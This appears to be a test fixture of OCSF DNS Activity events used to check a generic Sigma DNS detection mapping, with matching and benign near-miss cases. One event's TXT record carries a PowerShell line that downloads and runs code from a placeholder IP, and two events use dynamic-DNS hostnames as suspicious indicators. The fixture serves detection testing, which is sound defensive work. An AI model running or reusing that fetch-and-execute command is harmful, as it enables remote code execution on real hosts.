// OCSF DNS Activity (4003) fixture events for the product-less
// `sigma/generic/dns` mapping family. Commented events are near-miss
// negatives.
{
  id: "txt-payload",
  time: 2024-05-01T12:00:00Z,
  class_uid: 4003,
  activity_id: 2,
  metadata: {version: "1.9.0", product: {name: "BIND", vendor_name: "ISC"}},
  src_endpoint: {ip: 10.0.0.42},
  dst_endpoint: {ip: 192.0.2.53, port: 53},
  query: {hostname: "cdn.updates.duckdns.org", type: "TXT"},
  answers: [{type: "TXT", rdata: "powershell -c IEX (iwr http://198.51.100.7/a)"}],
  rcode_id: 0,
}
// Matches: Sysmon-shaped DNS Activity is conformant DNS Activity, too.
{
  id: "sysmon",
  time: 2024-05-01T12:00:01Z,
  class_uid: 4003,
  activity_id: 1,
  metadata: {version: "1.9.0", profiles: ["host"], event_code: "22", log_name: "Microsoft-Windows-Sysmon/Operational", product: {name: "Microsoft-Windows-Sysmon", vendor_name: "Microsoft"}},
  device: {hostname: "ws01", os: {type_id: 100, name: "Windows"}},
  query: {hostname: "home.ddns.net", type: "A"},
}
// Projection must not match: a benign domain.
{
  id: "benign",
  time: 2024-05-01T12:00:02Z,
  class_uid: 4003,
  activity_id: 1,
  metadata: {version: "1.9.0", product: {name: "BIND", vendor_name: "ISC"}},
  query: {hostname: "www.example.test", type: "A"},
}
